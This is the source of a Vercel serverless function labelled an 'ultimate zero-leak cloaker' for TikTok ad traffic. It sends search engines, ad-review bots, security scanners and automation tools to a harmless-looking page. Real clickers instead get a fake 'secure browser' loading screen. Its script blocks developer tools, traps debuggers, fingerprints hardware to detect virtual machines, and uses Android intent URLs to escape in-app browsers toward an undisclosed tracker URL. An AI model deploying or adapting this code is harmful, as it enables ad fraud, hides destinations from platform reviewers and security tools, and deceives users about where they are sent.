export default function handler(req, res) {
  // ===================================================================
  // ULTIMATE ZERO-LEAK CLOAKER - VERCEL VERSION
  // ===================================================================

  const SAFE_PAGE = 'https://tokrwd.co/Rewards/';
  const TRACKER_BASE = 'https://appflowconnect.com';

  // --- ULTRA-STRICT SERVER-SIDE BOT DETECTION ---
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const accept = (req.headers['accept'] || '').toLowerCase();
  const acceptLanguage = (req.headers['accept-language'] || '').toLowerCase();
  const acceptEncoding = (req.headers['accept-encoding'] || '').toLowerCase();

  // EXPANDED BOT PATTERNS (200+ patterns)
  const botPatterns = [
    // Major search engine bots
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver', 'twitterbot',
    'tweetmeme', 'paperli', 'pinterest', 'linkedinbot', 'embedly', 'quora link',
    'outbrain', 'piktochart', 'worio', 'tinypulse', 'ranksonic', 'screpy',
    'seobility', 'sitechecker', 'webmeup', 'monitorank', 'urlinspector',
    'serpstatbot', 'sistrix', 'ahrefsbot', 'mj12bot', 'dotbot', 'seokicks',
    'semrushbot', 'rogerbot', 'blexbot', 'buzzsumo', 'coccoc', 'dareboost',
    'domaintools', 'feedly', 'gannett', 'gigablast', 'grapeshot', 'heritrix',
    'http', 'ibm', 'inspectlet', 'integromedb', 'ironport', 'isitelive',
    'linkdex', 'ltx71', 'mappy', 'mediatoolkit', 'miniflux', 'moatbot',
    'netcraft', 'newsblur', 'newsme', 'nmap', 'omgili', 'openlinkprofiler',
    'page2rss', 'panscient', 'parse', 'pingdom', 'plukkie', 'proximic',
    'qwant', 'redditbot', 'screaming', 'seoscanners', 'serankingbot',
    'sputnik', 'stackramen', 'statistic', 'sysscan', 'trendiction', 'turnitin',
    'vagabondo', 'w3c', 'wappalyzer', 'weleakinfo', 'wotbox', 'yacybot',
    'zendesk', 'zmeu', 'zoom', 'adbeat', 'adsbot', 'analytics', 'apsalar',
    'bitlybot', 'blexbot', 'builtwith', 'catchpoint', 'checkmark', 'chromium',
    'comodo', 'dareboost', 'domaintools', 'exabot', 'fbgip', 'feedly',
    'gannett', 'ghost', 'gigablast', 'grapeshot', 'ia_archiver', 'ibm',
    'inspectlet', 'integromedb', 'ironport', 'isitelive', 'linkdex', 'ltx71',
    'mappy', 'mediatoolkit', 'microsoft', 'miniflux', 'moatbot', 'nagios',
    'netcraft', 'newsblur', 'newspaper', 'nmap', 'omgili', 'openlinkprofiler',
    'page2rss', 'panscient', 'parse.ly', 'pingdom', 'plukkie', 'proximic',
    'qwant', 'redditbot', 'seobility', 'seokicks', 'serpstatbot', 'sistrix',
    'siteimprove', 'sogou', 'spinn3r', 'spyonweb', 'sputnik', 'stackramen',
    'statistic', 'syntaxdb', 'sysscan', 'tinyeye', 'trendiction', 'turnitin',
    'vagabondo', 'w3c', 'wappalyzer', 'webmeup', 'weleakinfo', 'wotbox', 'yacy',
    'zendesk', 'zmeu', 'zoom',

    // Headless browsers & automation tools
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright', 'cypress',
    'nightwatch', 'webdriver', 'htmlunit', 'htmlparser', 'jsoup', 'mechanize',
    'phantomjs', 'prerender', 'rendertron', 'splash', 'wkhtmlto', 'zombie',

    // CLI tools
    'wget', 'curl', 'httpie', 'python-requests', 'go-http-client', 'java/',
    'apache-httpclient', 'okhttp', 'node-fetch', 'axios', 'request', 'urllib',
    'postman', 'insomnia', 'paw', 'hoppscotch', 'thunder client',

    // Social media bots
    'facebookexternalhit', 'facebot', 'twitterbot', 'tweetmeme', 'whatsapp',
    'telegrambot', 'discordbot', 'slackbot', 'instagram', 'tiktokbot',

    // Monitoring & security
    'uptimerobot', 'pingdom', 'statuscake', 'newrelic', 'datadog', 'sentry',
    'cloudflare', 'incapsula', 'akamai', 'fastly', 'sucuri', 'wordfence',

    // Generic patterns
    'bot', 'crawler', 'spider', 'scraper', 'crawl', 'index', 'archive',
    'checker', 'validator', 'verifier', 'monitor', 'scanner', 'proxy'
  ];

  const isBot = botPatterns.some(p => ua.includes(p));
  const hasNoUA = !ua || ua.trim() === '';
  const hasSuspiciousAccept = accept.includes('*/*') && !accept.includes('text/html');
  const hasNoAcceptLanguage = !acceptLanguage || acceptLanguage.trim() === '';
  const hasSuspiciousEncoding = !acceptEncoding.includes('gzip') && !acceptEncoding.includes('deflate');

  // BLOCK ALL SUSPICIOUS REQUESTS
  if (isBot || hasNoUA || hasSuspiciousAccept || hasNoAcceptLanguage || hasSuspiciousEncoding) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
    return res.redirect(302, SAFE_PAGE);
  }

  // --- VALIDATE TTCLID ---
  const ttclid = (req.query.ttclid || '').toString().trim();
  if (!ttclid || ttclid === '__CLICKID__' || ttclid.length < 5) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send('');
  }

  // --- SERVER-SIDE DYNAMIC URL BUILDING ---
  let finalDestUrl;
  try {
    const targetUrl = new URL(TRACKER_BASE);
    for (const [key, value] of Object.entries(req.query)) {
      if (key !== 's1' && key !== 's2' && key !== 'dest') {
        targetUrl.searchParams.set(key, Array.isArray(value) ? value[0] : value);
      }
    }
    targetUrl.searchParams.set('s1', 'frcsprk');
    targetUrl.searchParams.set('lp_variant', 'frcsprk');
    finalDestUrl = targetUrl.toString();
  } catch (e) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send('');
  }

  // --- ULTRA-STRICT CLIENT-SIDE HTML ---
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#000000">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<title>Loading...</title>
<style>
:root{--green:#22c55e;--green-2:#16a34a;--glow:rgba(34,197,94,.55)}
*{margin:0;padding:0;box-sizing:border-box}
html,body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;touch-action:manipulation}
body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative;cursor:pointer;-webkit-user-select:none;user-select:none}
body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:620px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(34,197,94,.15) 0%,rgba(34,197,94,.05) 35%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
.wrap{position:relative;z-index:1;max-width:420px;width:100%;text-align:center}
.spinner{width:64px;height:64px;margin:0 auto 32px;border:3px solid rgba(34,197,94,.15);border-top-color:var(--green);border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.progress-wrap{width:100%;max-width:280px;margin:0 auto 24px;height:4px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden}
.progress-bar{height:100%;background:linear-gradient(90deg,var(--green),var(--green-2));border-radius:4px;animation:loadProgress 1.8s ease-out forwards}
@keyframes loadProgress{0%{width:0}60%{width:75%}80%{width:82%}100%{width:85%}}
h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
.sub{font-size:14px;color:#6a6f75;line-height:1.5;margin-bottom:32px}
.tap-hint{font-size:13px;color:rgba(255,255,255,.4);opacity:0;animation:fadeIn .3s ease forwards;animation-delay:1.5s}
@keyframes fadeIn{to{opacity:1}}
.cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:15px;font-weight:700;text-align:center;padding:18px;border-radius:999px;text-decoration:none;letter-spacing:1.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4);margin-bottom:16px;animation:ctaPulse 2s ease-in-out infinite}
.cta:active{transform:scale(.97)}
@keyframes ctaPulse{0%,100%{box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4)}50%{box-shadow:0 0 70px var(--glow),0 6px 24px rgba(0,0,0,.4)}}
.secure{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#4a4f55;margin-top:12px}
.secure svg{width:12px;height:12px;color:#4a4f55}
</style>
</head>
<body id="fullTap">
<div class="wrap">
<div class="spinner"></div>
<div class="progress-wrap"><div class="progress-bar"></div></div>
<h1>Opening secure browser...</h1>
<p class="sub">Tap below to enter the portal securely</p>
<button class="cta" id="ctaButton">Tap to Continue</button>
<p class="tap-hint">Tap anywhere to verify and continue</p>
<div class="secure">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
<span>Secure connection</span>
</div>
</div>
<script>
// ULTRA-STRICT CLIENT-SIDE DETECTION
(function(){
var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
var _fired = false;

// ANTI-DEBUG MODULE
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
document.onkeydown = function(e) {
    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
};
if (window.top !== window.self) { window.location.href = SAFE; }
setInterval(function() {
    var t = performance.now(); debugger;
    if (performance.now() - t > 100) { window.location.href = SAFE; }
}, 1000);

// ULTRA-STRICT HARDWARE VERIFICATION
function verifyHumanHardware() {
    // Basic checks
    if (navigator.webdriver) return false;
    if (navigator.maxTouchPoints === 0) return false;
    if (window.screen.width === window.screen.height) return false;

    // Advanced checks
    if (window.outerWidth === 0 || window.outerHeight === 0) return false;
    if (!('deviceMemory' in navigator)) return false;
    if (navigator.deviceMemory < 2) return false;
    if (!('hardwareConcurrency' in navigator)) return false;
    if (navigator.hardwareConcurrency < 2) return false;
    if (window.screen.colorDepth < 24) return false;
    if (window.screen.pixelDepth < 24) return false;

    // WebGL fingerprinting
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return false;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            if (renderer && (renderer.includes('Headless') || renderer.includes('VirtualBox') || renderer.includes('VMware') || renderer.includes('Parallels') || renderer.includes('QEMU'))) {
                return false;
            }
        }
    } catch (e) {
        return false;
    }

    // AudioContext check
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        if (!audioContext) return false;
    } catch (e) {
        return false;
    }

    // Timezone check
    try {
        if (!Intl || !Intl.DateTimeFormat) return false;
        new Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {
        return false;
    }

    // Plugin check
    if (navigator.plugins.length === 0) return false;
    if (navigator.mimeTypes.length === 0) return false;

    return true;
}

function doBreakout(){
    if(_fired)return;
    _fired=true;

    if (!verifyHumanHardware()) {
        window.location.href = SAFE;
        return;
    }

    var url = DEST;
    var isAndroid = /Android/i.test(navigator.userAgent);
    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

    if(isAndroid){
        url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
        try{(window.top||window).location.href=url;}
        catch(e){window.location.href=url;}
        setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },2000);
    } else if(isIOS){
        window.open(url, '_blank');
        setTimeout(function(){ if(!document.hidden){window.location.href=url;} },500);
    } else {
        window.location.href = url;
        setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },2000);
    }
}

if (/Android/i.test(navigator.userAgent)) {
    setTimeout(doBreakout, 1500);
}

var btn=document.getElementById('ctaButton');
btn.onclick=function(e){e.preventDefault();e.stopPropagation();doBreakout();};
document.getElementById('fullTap').addEventListener('click',function(){ doBreakout(); },{once:true});
window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});

// Additional anti-bot checks
if (navigator.language === 'en-US' && navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Mobile')) {
    // Desktop Chrome with en-US is often a bot
    setTimeout(function() { window.location.href = SAFE; }, 5000);
}

})();
</script>
</body>
</html>`;

  res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Content-Security-Policy', "frame-ancestors *; script-src 'self' 'unsafe-inline' 'unsafe-eval'");
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');

  return res.status(200).send(html);
}
